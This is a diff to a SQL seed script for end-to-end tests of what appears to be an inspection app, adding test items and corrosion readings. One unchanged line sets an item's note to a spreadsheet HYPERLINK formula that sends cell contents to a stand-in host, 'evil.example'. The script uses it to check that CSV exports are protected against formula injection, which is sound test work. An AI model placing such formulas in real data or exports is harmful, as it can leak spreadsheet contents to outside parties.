@@ -57,9 +57,17 @@ SELECT v.id::uuid, u.id, v.zone, v.name, 'Attention', 3, 3, v.notes,
          ('00000000-0000-0000-0000-0000000e2e09', 'Z13', 'E2E Lost Response Target', 'base note'),
          ('00000000-0000-0000-0000-0000000e2e0a', 'Z13', 'E2E Deleted Elsewhere Target', 'base note'),
          ('00000000-0000-0000-0000-0000000e2e0b', 'Z13', 'E2E Draft Conflict Target', 'base note'),
-         ('00000000-0000-0000-0000-0000000e2e0c', 'Z13', 'E2E Evidence Fail Target', 'base note')
+         ('00000000-0000-0000-0000-0000000e2e0c', 'Z13', 'E2E Evidence Fail Target', 'base note'),
+         ('00000000-0000-0000-0000-0000000e2e0d', 'Z13', 'E2E Rate Target', 'base note'),
+         ('00000000-0000-0000-0000-0000000e2e0e', 'Z13', 'E2E Nav Target', 'base note'),
+         ('00000000-0000-0000-0000-0000000e2e0f', 'Z13', 'E2E A11y Target', 'base note')
        ) AS v(id, zone, name, notes)
  WHERE u.code = 'SS-75';
+-- Two readings a year apart -> corrosion rate 0.125 mm/yr (decimal in CSV).
+INSERT INTO public.readings (item_id, reading_date, depth_mm, location)
+VALUES ('00000000-0000-0000-0000-0000000e2e0d', current_date - 365, 1.000, 'FR-1'),
+       ('00000000-0000-0000-0000-0000000e2e0d', current_date, 1.125, 'FR-1');
+
 -- A formula-looking note on an audited change, for the CSV injection check.
 UPDATE public.items SET notes = '=HYPERLINK("http://evil.example/?x="&A1,"x")'
  WHERE id = '00000000-0000-0000-0000-0000000e2e08';
